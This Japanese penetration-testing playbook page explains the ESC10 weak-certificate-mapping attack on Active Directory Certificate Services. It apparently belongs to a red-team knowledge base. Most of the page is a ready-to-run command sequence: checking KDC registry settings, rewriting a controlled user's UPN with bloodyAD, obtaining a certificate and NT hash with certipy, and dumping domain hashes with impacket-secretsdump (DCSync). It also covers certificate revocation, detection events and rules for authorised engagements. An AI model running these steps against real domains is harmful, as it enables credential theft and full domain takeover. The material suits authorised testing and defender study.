# ESC10 — Weak Certificate Mappings（レガシー UPN マッピング悪用）

> **スコープ**: KDC の `StrongCertificateBindingEnforcement` が 0 または 1（互換モード）の場合に、ESC9 と同様の UPN 書き換えで証明書取得〜DCSync まで扱う。テンプレートの `CT_FLAG_NO_SECURITY_EXTENSION` は不要。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 持続化に該当（発行した証明書はパスワード変更後も有効）
> - [x] SIEM/EDR で確実に検知される（Event ID 4886・4887・4768・4738・MDI アラート）
> - [ ] 業務停止リスク（証明書発行自体は業務影響なし）
> - [x] 不可逆な設定変更を含む（UPN を一時書き換えるため書き換え中にロック・混乱が起きるリスクあり）
>
> 実施可否は事前合意で明示確認すること。取得した証明書はテスト完了時に CA で失効させること。演習環境では制約なし。

## 着火条件

**Case 1（弱い KDC バインディング：StrongCertificateBindingEnforcement = 0）:**

- DC レジストリの `StrongCertificateBindingEnforcement` が **0**（完全無効）または不在（2022年5月パッチ前のデフォルト）
- 攻撃者が任意のドメインユーザーに対して `GenericWrite` または `WriteProperty(userPrincipalName)` 権限を持つ

**Case 2（UPN マッピング許可：CertificateMappingMethods に UPN ビット）:**

- `StrongCertificateBindingEnforcement` が **1**（互換モード）かつ `CertificateMappingMethods` に UPN マッピングビット（`0x4`）が含まれる

## 環境前提
- 実行環境: テスター端末
- 必要なツール: `certipy`（`pip install certipy-ad`）/ `bloodyAD`（UPN 書き換え用）
- 必要な権限: 制御可能なユーザーアカウントに対する `GenericWrite` または `WriteProperty(userPrincipalName)` ACE

## 先に確認すること

**ESC9 との違い:** ESC9 は「テンプレートが `CT_FLAG_NO_SECURITY_EXTENSION` を持つ」ことが必要。ESC10 は「KDC 側のレジストリ設定が弱い」ことが条件。どちらも UPN 書き換えを使う点は共通。ESC10 はテンプレートの条件が緩い点が利点。

**攻撃者の思考トレース:** CVE-2022-26923（Certifried）の修正パッチ（KB5014754）は `StrongCertificateBindingEnforcement=2` によって対策された。設定値が 0 や 1 に留まっている環境では依然として UPN ベースのマッピングが機能するため、ESC9 と同様の UPN 書き換え攻撃が通用する。

---

## 1. KDC 設定の確認

**コマンド:**

```bash
# [Attacker] ESC10 の検出（certipy は KDC 設定を推定して報告する）
certipy find -u [USER]@[DOMAIN] -p "[PASSWORD]" -dc-ip [DC_IP] -vulnerable -stdout
```

```powershell
# [Target] KDC のレジストリ設定を直接確認（SYSTEM 権限取得後）
reg query "HKLM\System\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement
reg query "HKLM\System\CurrentControlSet\Services\Kdc" /v CertificateMappingMethods
# StrongCertificateBindingEnforcement の値:
#   0 = 強制なし（Case 1）
#   1 = 互換モード（Case 2 に該当する可能性）
#   2 = 完全強制（ESC10 は使えない）
```

**観測される出力 → 次のアクション:**

| シグナル | 判断 |
|---------|------|
| `ESC10 (Case 1)` が表示 | `StrongCertificateBindingEnforcement=0`。§2 UPN 書き換えへ |
| `ESC10 (Case 2)` が表示 | `CertificateMappingMethods` に UPN ビットあり。§2 UPN 書き換えへ |
| `StrongCertificateBindingEnforcement=2` | ESC10 は使えない。ESC1〜ESC8 の経路を改めて確認する |

---

## 2. 制御可能ユーザーの UPN を標的 UPN に書き換えて証明書申請

Case 1 / Case 2 とも UPN 書き換え手順は ESC9（`ESC9.md`）と同一。

**事前準備（必須）:** `sudo ntpdate -u [DC_IP]` で時刻同期。

**コマンド（ESC9 §2〜§5 と同一フロー）:**

```bash
# [Attacker] Step 1: UPN を標的 UPN に書き換える
bloodyAD --host [DC_IP] -d [DOMAIN] -u [ATTACKER_USER] -p "[ATTACKER_PASSWORD]" \
  set attribute [CONTROLLED_USER] userPrincipalName "[TARGET_UPN]"

# [Attacker] Step 2: Client Authentication EKU を持つ任意のテンプレートで申請
certipy req \
  -ca [CA_NAME] -template [TEMPLATE_NAME] \
  -u [CONTROLLED_USER]@[DOMAIN] -p "[CONTROLLED_USER_PASSWORD]" -dc-ip [DC_IP]
# → [CONTROLLED_USER].pfx が生成される（証明書内 UPN = TARGET_UPN）

# [Attacker] Step 3: UPN を元に戻す（即時）
bloodyAD --host [DC_IP] -d [DOMAIN] -u [ATTACKER_USER] -p "[ATTACKER_PASSWORD]" \
  set attribute [CONTROLLED_USER] userPrincipalName "[ORIGINAL_UPN]"

# [Attacker] Step 4: PKINIT 認証 → NT ハッシュ取得
certipy auth -pfx [CONTROLLED_USER].pfx -domain [DOMAIN] -username [TARGET_USERNAME] -dc-ip [DC_IP]

# [Attacker] Step 5: DCSync
impacket-secretsdump -just-dc-ntlm -no-pass -hashes :[NT_HASH] [DOMAIN]/[TARGET_USERNAME]@[DC_IP]

# [Attacker] 原状回復: 証明書の失効
certipy ca -ca [CA_NAME] -u [USER]@[DOMAIN] -p "[PASSWORD]" -dc-ip [DC_IP] -revoke [REQUEST_ID]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| NT ハッシュが出力される | ESC10 悪用成功 | DCSync → `../Credential_Dumping.md` |
| `KDC_ERR_CLIENT_NOT_TRUSTED` | `StrongCertificateBindingEnforcement=2` に設定されている可能性 | レジストリを直接確認できる権限があれば確認する |

---

## 刺さらなかったとき（全体）

| 状況 | 対処 |
|------|------|
| `certipy auth` が失敗する | `StrongCertificateBindingEnforcement=2` に設定されている可能性。ESC1〜ESC8 の経路を改めて確認 |
| Case 2 で `certipy auth` が失敗する | 証明書の SAN/Subject の内容を `openssl x509 -in [CONTROLLED_USER].pfx -noout -text` で確認する |
| UPN 書き換えに `ACCESS_DENIED` | `WriteProperty` の対象属性が `userPrincipalName` に限定されているか BloodHound で再確認 |

---

## 注意点・落とし穴

- **Case 1（0 設定）は 2022年5月パッチ前のデフォルト**: `StrongCertificateBindingEnforcement` キー自体が存在しない場合、不在 = 0（Case 1 相当）と解釈される
- **UPN 書き換え中の業務影響**: 書き換え〜元に戻すまでの間、対象ユーザーの Kerberos 認証が乱れる場合がある。本番では深夜・メンテナンスウィンドウでの実施を強く推奨
- **Certipy のバージョン確認**: ESC10 の検出は Certipy 4.x 以降で実装

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）
- **想定されるSIEM/EDR検知**: Event ID 4738（UPN 書き換え）/ 4886・4887（証明書要求・発行）/ 4768（TGT 要求）/ MDI「証明書ベースの横断移動」アラート
- **業務影響リスク**: UPN 書き換え中に対象ユーザーが認証を試みると失敗する可能性あり
- **原状回復必須項目**: ✅ 書き換えた UPN を元の値に戻す / ✅ 発行した証明書を CA で失効 / ✅ 取得した NT ハッシュ・TGT・pfx の暗号化保管・テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：AD CS の列挙と ESC 番号の特定 → `Overview.md`
- 前：ESC9（テンプレート側の No Security Extension 設定悪用）→ `ESC9.md`
- 前：GenericWrite によるユーザー属性書き換え → `../ACE_Abuse/GenericWrite.md`
- 後：証明書取得後の DCSync → `../Credential_Dumping.md`
- ツール詳細 → `../../05_Tools_Reference/Certipy.md`
